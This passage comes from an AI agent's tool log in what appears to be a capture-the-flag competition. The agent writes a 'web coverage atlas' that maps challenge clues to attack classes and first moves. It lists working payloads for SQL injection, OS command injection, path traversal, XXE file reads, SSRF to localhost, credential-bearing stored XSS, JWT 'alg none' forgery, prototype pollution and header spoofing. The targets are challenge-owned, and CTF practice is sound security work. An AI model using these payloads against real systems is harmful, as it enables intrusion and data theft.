n URLs/logs | reuse a leaked id the app shows | med |\n| 33 | static web evidence (HAR, pcap, logs, web shell) | gap (never released) | `.har`, pcap magic, combined-log lines | jq / tshark / decode layers | low |\n| 34 | type juggling / loose comparison / JSON type confusion | gap | PHP/Node costume, `==` compare of token/PIN, JSON login | `true`, `0`, `[]`, `{\"$gt\":\"\"}`, `\"0e1\"` | med |\n| 35 | HTTP parameter pollution / duplicate keys | gap | same param twice, proxy + app split, \"first one wins\" | `a=1&a=2`, duplicate JSON keys, array params | low-med |\n| 36 | excessive data exposure / field-filter read (BOPLA read) | gap | API list returning more than the page shows, `?fields=`, `include=`, `expand=` | request hidden fields / `?fields=*` | med |\n| 37 | second-order sequels for other classes (stored SSTI / XSS / cmd read later) | gap | \"save now, rendered later\", profile shown on another page | plant per-class payload, read the secondary | med (D12 pattern) |\n\n## Recognition cues (worker quick-reference)\n\n```\nFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n  GET /api/clues   -> feature_route / secondary_route / current_role + ZERO or ONE concept key\n  GET each clue route BARE: the JSON error names the missing piece (session_id_required, authenticated_login_required,\n      browser_callback_required, post_required(405) = a POST sink, administrator_required(403) = privilege check)\n  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n  regex  proof_[0-9a-f]{32}  over EVERY body (JSON/base64/zip decoded). An `effect` without the proof is NOT a solve.\n  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = not ready, re-poll hctf status.\nPick routes by clue KEY (feature_/secondary_/*_data_route/*_template) and openapi paths, NEVER by the word in the\nvalue (callback|internal|status|result|audit, messages|postcards are re-dealt even between single and TT).\nNo concept key (D11-D13) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\nMASTERY: 3 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged.\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\nsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\nfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\ncallback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then\n      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, form + hidden csrf_token,           -> CSRF (D09)         -> submit the form's external option with Sec-Fetch-Site:\n  \"obeys whoever asks nicely -- even strangers\"             cross-site, Mode: navigate, Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route/preview_guide                -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n  \"upload form has standards. Low ones\"                     content_type:\"text/html\"} -> GET the returned path\n\"template engine evaluates\", \"speak in expressions\",   -> SSTI (D11)         -> feature?template=a${7*7}b{{7*7}}c (one probe per param:\n  empty \"Rendered message\" <pre>                            template|message|q|name|text) -> {{objective}} in the family that gave 49\n\"plant ... come back later\", \"delayed echo\",           -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"} (also\n  feature post_required, secondary {\"rows\":[]}               \"zz' OR 1=1 --\"), GET secondary after each plant -> rows[] has proof\n\"API binds whatever you hand it\", \"promotion\",         -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n  feature post_required, secondary administrator_required    admin, roles:[\"admin\"], access_level, permissions}; GET secondary\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)\n\"fetch URL\", \"webhook\", \"import\"                      -> SSRF               -> http://127.0.0.1/<clue route>, file:///run/...\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\nXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\nA real victim browser exists (D07): anything \"the admin/reviewer visits\" can run your JS with their cookies; receipts\ncan land >12 s later. \"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin\nmatrix yourself. NEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11\ndid -> TT first try; D09, D10, D12, D13 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (~6-9 lane-days at the current pace). \"prebuild\" = pure python handler\n(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\ndecoy. \"note\" = harness/prompt change. \"tool\" = install. None built (no web prebuild lane). Dropped after D13:\n`ssti-engine-probe` (seen D11), `port-day22-handlers` (csrf/upload now in lib/web/handlers); mass assignment (seen\nD13) removed from `role-tamper-planner`, second-order SQLi (seen D12) from `sqli-union-blind`.\n\n```json\n"}}}
{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_013XKn2FeS9ZXNLP1PxCXEWm","type":"tool_result","content":"File created successfully at: /home/testpwn/huntress-2026/.run/tmp/ratchet-log-0f1076e8/head.md (file state is current in your context — no need to Read it back)"}]},"parent_tool_use_id":null,"session_id":"05381da5-85e0-49d3-87e4-724cb00f5f8b","uuid":"707681d5-f38a-4019-833c-01928a7cb383","timestamp":"2026-10-23T13:34:38.741Z","tool_use_result":{"type":"create","filePath":"/home/testpwn/huntress-2026/.run/tmp/ratchet-log-0f1076e8/head.md","content":"# Web coverage atlas\n\nLane: a LIVE challenge-owned target per question (`targets[{id:\"Target N\", url}]`, no artifact), one `proof-N`\nquestion per target, answer = the token `proof_<32 hex>` the app prints once the bug is exploited (`trim`). One\nclassic bug per lane-day, named by a title pun: D01 exposed backup, D02 IDOR, D03 SQLi (paren-wrapped LIKE), D04 path\ntraversal to `/run/huntress/objective.txt`, D05 unprotected feature route, D06 reflected XSS (server-judged \"isolated\ncallback\"), D07 stored XSS (real moderator bot), D08 session fixation, D09 CSRF (server-judged by\n`Sec-Fetch-Site: cross-site`), D10 unrestricted upload rendered by a `{{field}}` template preview, D11 SSTI\n(`?template={{objective}}`), D12 second-order SQLi (JSON plant, delayed reader), D13 mass assignment (privilege keys\nbound from a JSON profile update). Since D05 every target is the same kit: `/api/clues` names `feature_route`, often\n`secondary_route` (or `render_route`/`preferences_route`), `current_role: analyst` + zero or one concept key\n(`callback_nonce`, `moderator_data_route`/`receipt_route_template`, `session_hint`, `preview_guide`/`upload_policy`/\n`upload_shape`). D11-D13 had NO concept key: the prompt and the bare-route errors (`post_required` 405,\n`administrator_required` 403, an empty \"Rendered message\" `<pre>`) were the routing signal. Stated policies and\nechoes are costume (D09 token, D10 type rule, D13 echo hid the bound role). Success = proof regex, never `effect`\nalone (D12 prints its effect with empty rows). Mastery = today's bug + earlier lane-days (3 targets since D08),\ndescribed only by today's prompt. Pace: D01-D03 cal. 19, D04-D05 cal. 20, D06-D08 cal. 21, D09-D10 cal. 22, D11-D13\ncal. 23 -> D14-D31 (18 lane-days) over cal. 24-31, ~2-3 per day; priority 1 below = likely in D14-D21.\nArc: info-disclosure -> access control -> injection -> file read -> access control -> XSS (reflected, stored) ->\nsession fixation -> CSRF -> upload -> SSTI -> second-order SQLi -> mass assignment. Server-side/API run since D10,\neach a classic OWASP item, several \"one level deeper\" sequels of earlier days (D10->D11 templates, D03->D12 SQLi,\nD05->D13 authz). Still missing classics, most likely next: OS command injection, SSRF, XXE, JWT / signed-cookie\nforgery, role via cookie/header, open redirect, DOM XSS; then deserialization, prototype pollution, NoSQL, race,\nCORS, header trust, GraphQL, password reset, cache poisoning.\nSnapshot 2026-10-23 (after D13). `lib/web/handlers/__init__.py` holds `session_fixation`, `upload`, `csrf` (+\n`default` ladder) and loads per-day plugins `lib/web/handlers/dayNN_*.py` (each exports `KEY_MAP` + `HANDLERS`; D23\nadded `template_temper` SSTI, `ask_again_later` second-order, `posted_too_much` mass assignment). `hctf prebuild`\nstill has NO `web` lane and no `web:*` keys exist in `.run/prebuild-state.json` -> every prebuild gap is pending.\n\nStatus legend: `seen Dnn` = GM-confirmed lane-day (solver in `challenges/<cal-day>/web-*/solver/solve.py`, handler in\n`lib/web/handlers/`). `gap` = nothing reusable in lib. Prebuilt web modules must be PURE (no `urllib.request`): bodies\nin -> request plan `[(method, path, headers, body)]` out; response in -> proof or next hints. The solver fetches.\n\n## Coverage table\n\n| # | concept | status | recognition cues | first move | likelihood next 3 cal. days |\n|---|---|---|---|---|---|\n| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery x3) | robots `Disallow: /<word>-<hex>/`, \"crawler policy\", \"archive\" | robots -> index -> every link (depth 2) | done; Mastery |\n| 2 | IDOR (object-level authz) | seen D02 (Mastery x2) | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)` | foreign ids from `/api/history` | done; Mastery |\n| 3 | SQL injection (tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family + quote-balanced | done; Mastery |\n| 3b | second-order SQLi (stored value queried later) | seen D12 | \"plant your question inside the data and come back later\", \"delayed echo\", feature 405 `post_required`, secondary `{\"rows\":[],\"effect\":..}` | POST JSON every field = `x' OR '1'='1' -- `, GET secondary; `rows[]` holds proof | done; Mastery |\n| 4 | path traversal / LFI | seen D04 (Mastery) | `?doc=`/`?page=` filename value, \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |\n| 5 | missing function-level authz (unlinked route) | seen D05 (Mastery) | \"staff-only, just a sign\", clue `feature_route` | GET the clue route | done; Mastery |\n| 6 | role / privilege via client-controlled header, query or cookie | gap | `current_role: analyst` in every clue JSON, `role=` cookie, `X-Role` in errors | flip the value the app names | high (D13 did the body form) |\n| 7 | JWT tampering (`alg:none`, leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization` | decode; resign with `none` / leaked secret | high |\n| 8 | signed-cookie / session forgery (Flask, Express `s:`, base64 JSON) | gap | `session=eyJ...`, `s%3A`, base64 JSON cookie | decode; re-sign with a leaked secret | high |\n| 9 | mass assignment / over-posting | seen D13 | \"the form only asked for your name. But the API binds whatever you hand it\", \"promotion\", feature 405 `post_required`, secondary 403 `administrator_required` | POST JSON `display_name` + role/is_admin/isAdmin/admin/roles/access_level/permissions, GET secondary | done; Mastery |\n| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\", \"shell\" | `;cat /run/huntress/objective.txt`, `|`, `$()`, `%0a` | very high |\n| 11 | SSTI (expression in a rendered message) | seen D11 | \"template engine ... evaluates everything\", \"speak in expressions\", \"Rendered message\" `<pre>` | `?template={{7*7}}` -> 49, then `{{objective}}` | done; Mastery |\n| 11b | SSTI sequels: sandbox escape / file read / stored template | gap | `{{objective}}` absent or filtered, \"sandbox\", \"safe mode\", stored profile rendered later | engine fingerprint -> per-engine file read of prompt path | med |\n| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\", \"import\" | `http://127.0.0.1/<clue route>`, `file:///run/...` | very high |\n| 13a | reflected XSS (server-judged callback) | seen D06 | \"repeats everything\", \"talks back\", clue `callback_nonce` | reflect `<script>fetch(cb?nonce)`, then GET cb with Sec-Fetch-* + Referer | done; Mastery |\n| 13b | stored XSS (moderator bot) | seen D07 | \"guestbook\", \"reviewer stops by\", `moderator_data_route`, `receipt_route_template` | store fetch(data)->POST receipt script; poll entry | done; Mastery |\n| 13c | DOM XSS (`location.hash`/`search` -> `innerHTML`/`eval`) | gap | inline JS reading location, \"client-side\", \"nothing reaches the server\" | scan sinks; bot visits `#payload` URL or callback check | high |\n| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS | use the leaked pair (no brute force) | med |\n| 15 | header-trust bypass (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`) | gap | \"internal only\", \"localhost only\" | spoof the header the error names | med-high |\n| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `_method=` | other methods + overrides | med |\n| 17 | path-normalisation authz bypass | gap | 403 on a named route | `/ADMIN`,